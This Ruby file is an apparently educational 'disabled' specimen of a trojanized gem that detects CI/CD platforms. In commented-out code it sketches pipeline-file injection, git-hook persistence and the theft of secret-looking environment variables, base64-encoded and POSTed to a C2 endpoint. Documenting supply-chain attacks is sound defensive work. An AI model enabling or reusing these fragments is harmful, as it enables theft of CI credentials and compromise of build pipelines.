# frozen_string_literal: true

# =============================================================================
# RubyGuardian - Trojanized Gem Specimen: Post-Install Hook (DISABLED)
# =============================================================================
#
# EDUCATIONAL DISCLAIMER:
#   This file demonstrates how a trojanized gem's post-install hook might
#   inject malicious code into CI/CD pipelines. ALL MALICIOUS FUNCTIONALITY
#   IS COMMENTED OUT AND DISABLED. This file only contains educational
#   annotations explaining each attack technique.
#
#   This is a RESEARCH SPECIMEN. Do not uncomment or enable any payload code.
#
# MITRE ATT&CK References:
#   - T1195.002 : Supply Chain Compromise: Compromise Software Supply Chain
#   - T1059.004 : Command and Scripting Interpreter: Unix Shell
#   - T1546.016 : Event Triggered Execution: Installer Packages
#   - T1547     : Boot or Logon Autostart Execution
#   - T1041     : Exfiltration Over C2 Channel
#   - T1552.001 : Unsecured Credentials: Credentials In Files
#
# Attack Flow:
#   1. Developer adds 'config_helper' to Gemfile
#   2. `bundle install` triggers gem installation
#   3. Gemspec `extensions` field triggers extconf.rb (see ext/extconf.rb)
#   4. After install, this module's hooks activate on first `require`
#   5. The installer detects CI/CD environments and injects payloads
#   6. Exfiltrated data is sent to the C2 server
# =============================================================================

module ConfigHelper
  # Installer module demonstrates post-install CI/CD injection techniques.
  #
  # IMPORTANT: All methods in this module are DISABLED. They contain only
  # comments and logging explaining what a real attack would do. No actual
  # CI/CD manipulation, data exfiltration, or code injection is performed.
  module Installer
    # Research log file for tracking what WOULD have happened
    RESEARCH_LOG = File.expand_path('../../installer_research.log', __dir__)

    # =========================================================================
    # CI/CD Environment Detection (T1082 - System Information Discovery)
    # =========================================================================
    # Real trojanized gems detect CI environments to activate payloads
    # only during automated builds, avoiding detection on developer machines.

    CI_ENV_INDICATORS = {
      github_actions: %w[GITHUB_ACTIONS GITHUB_WORKFLOW GITHUB_RUN_ID],
      gitlab_ci:      %w[GITLAB_CI CI_PIPELINE_ID CI_JOB_TOKEN],
      jenkins:        %w[JENKINS_URL BUILD_ID EXECUTOR_NUMBER],
      circleci:       %w[CIRCLECI CIRCLE_BUILD_NUM CIRCLE_TOKEN],
      travis:         %w[TRAVIS TRAVIS_BUILD_ID],
      azure_devops:   %w[TF_BUILD BUILD_BUILDID SYSTEM_ACCESSTOKEN],
      bitbucket:      %w[BITBUCKET_PIPELINE_UUID BITBUCKET_BUILD_NUMBER],
      generic_ci:     %w[CI CONTINUOUS_INTEGRATION BUILD_NUMBER]
    }.freeze

    # Detect which CI/CD platform we are running on (if any)
    #
    # @return [Symbol, nil] the detected CI platform or nil
    def self.detect_ci_platform
      CI_ENV_INDICATORS.each do |platform, env_vars|
        if env_vars.any? { |var| ENV.key?(var) }
          log_research("CI platform detected: #{platform}")
          return platform
        end
      end

      log_research('No CI/CD environment detected')
      nil
    end

    # =========================================================================
    # DISABLED: Pipeline Injection Methods
    # =========================================================================
    # The following methods demonstrate what a real trojanized gem would do.
    # Every method is DISABLED - they only log what WOULD have happened.

    # DISABLED: Inject into GitHub Actions workflow
    # A real attack would modify .github/workflows/*.yml to add malicious steps
    #
    # def self.inject_github_actions
    #   # Attack: Append a step to existing workflows that exfiltrates secrets
    #   # Target files: .github/workflows/*.yml
    #   # Technique: Add a `run` step that base64-encodes and POSTs env vars
    #   #
    #   # workflow_files = Dir.glob('.github/workflows/*.yml')
    #   # workflow_files.each do |wf|
    #   #   content = File.read(wf)
    #   #   content += malicious_github_step
    #   #   File.write(wf, content)
    #   # end
    #   #
    #   # The step would look innocuous, like a "cleanup" or "telemetry" step
    #   log_research('DISABLED: Would inject into GitHub Actions workflows')
    # end

    # DISABLED: Inject into GitLab CI configuration
    # A real attack would modify .gitlab-ci.yml to add secret exfiltration
    #
    # def self.inject_gitlab_ci
    #   # Attack: Add an after_script block that sends CI_JOB_TOKEN to C2
    #   # Target: .gitlab-ci.yml
    #   # Technique: Append after_script with curl to C2 endpoint
    #   #
    #   # ci_config = YAML.safe_load(File.read('.gitlab-ci.yml'))
    #   # ci_config['after_script'] ||= []
    #   # ci_config['after_script'] << exfil_command
    #   # File.write('.gitlab-ci.yml', ci_config.to_yaml)
    #   log_research('DISABLED: Would inject into GitLab CI configuration')
    # end

    # DISABLED: Inject into Jenkinsfile
    # A real attack would modify Jenkinsfile to add credential harvesting
    #
    # def self.inject_jenkins
    #   # Attack: Append a stage that accesses Jenkins credential store
    #   # Target: Jenkinsfile
    #   # Technique: Use Jenkins credentials API to dump all stored secrets
    #   log_research('DISABLED: Would inject into Jenkinsfile')
    # end

    # DISABLED: Exfiltrate CI/CD environment secrets
    # This is the primary payload of a CI/CD poisoning attack
    #
    # def self.exfiltrate_secrets(platform)
    #   # Attack: Collect all environment variables that look like secrets
    #   # Targets: Variables matching patterns like *TOKEN*, *SECRET*, *KEY*,
    #   #          *PASSWORD*, *CREDENTIAL*, *API_KEY*, etc.
    #   #
    #   # secret_patterns = /TOKEN|SECRET|KEY|PASSWORD|CRED|API|AUTH|PRIVATE/i
    #   # secrets = ENV.select { |k, _| k.match?(secret_patterns) }
    #   #
    #   # Then encode and send to C2:
    #   # payload = Base64.strict_encode64(secrets.to_json)
    #   # Net::HTTP.post(C2_URI, payload)
    #   log_research("DISABLED: Would exfiltrate secrets from #{platform}")
    # end

    # DISABLED: Install persistence mechanism
    # Ensures the payload survives across pipeline runs
    #
    # def self.install_persistence
    #   # Attack: Add a git hook or modify package.json scripts to re-inject
    #   # Technique: Create .git/hooks/pre-commit that re-runs the payload
    #   #
    #   # This ensures that even if the trojanized gem is removed, the
    #   # injected hooks persist in the repository.
    #   log_research('DISABLED: Would install persistence hooks')
    # end

    # =========================================================================
    # Research Logging (The only functional code in this module)
    # =========================================================================

    # Log a research event to the research log file
    # This is the ONLY method that actually executes any I/O
    #
    # @param message [String] the message to log
    def self.log_research(message)
      timestamp = Time.now.iso8601
      entry = "[#{timestamp}] [RESEARCH] #{message}\n"

      # Write to log file if possible, otherwise silently skip
      File.open(RESEARCH_LOG, 'a') { |f| f.write(entry) }
    rescue StandardError
      # Silently ignore logging failures - this is research tooling
      nil
    end

    # Print a summary of what this installer WOULD do in a real attack
    #
    # @return [void]
    def self.print_research_summary
      puts <<~SUMMARY
        ================================================================
        RubyGuardian - CI/CD Poisoning Installer Research Summary
        ================================================================

        This module demonstrates the following attack techniques:

        1. CI/CD Environment Detection (T1082)
           Detects: #{CI_ENV_INDICATORS.keys.join(', ')}

        2. Pipeline Configuration Injection (T1195.002)
           Targets: GitHub Actions, GitLab CI, Jenkins, CircleCI

        3. Secret Exfiltration (T1041, T1552.001)
           Targets: Environment variables matching secret patterns

        4. Persistence Installation (T1547)
           Technique: Git hooks and build script modification

        ALL ATTACK FUNCTIONALITY IS DISABLED.
        This is a research specimen for educational purposes only.
        ================================================================
      SUMMARY
    end
  end
end
